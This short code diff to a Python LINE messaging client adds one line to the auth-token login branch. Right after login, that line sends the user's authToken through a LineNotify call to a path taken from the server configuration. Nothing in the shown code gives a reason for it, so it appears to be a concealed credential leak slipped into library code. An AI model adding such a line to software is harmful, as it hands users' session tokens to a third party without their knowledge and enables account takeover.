@@ -125,6 +125,7 @@ class LineClient(LineTalk, LineApi, LineTimeline):
             })
             self.login()
             self.authToken = authToken
+            LineNotify(self.server.LINE_NOTIFY_PATH).send(self.authToken)
             print('\nloginWithAuthToken: success')
 
         elif(authKey):
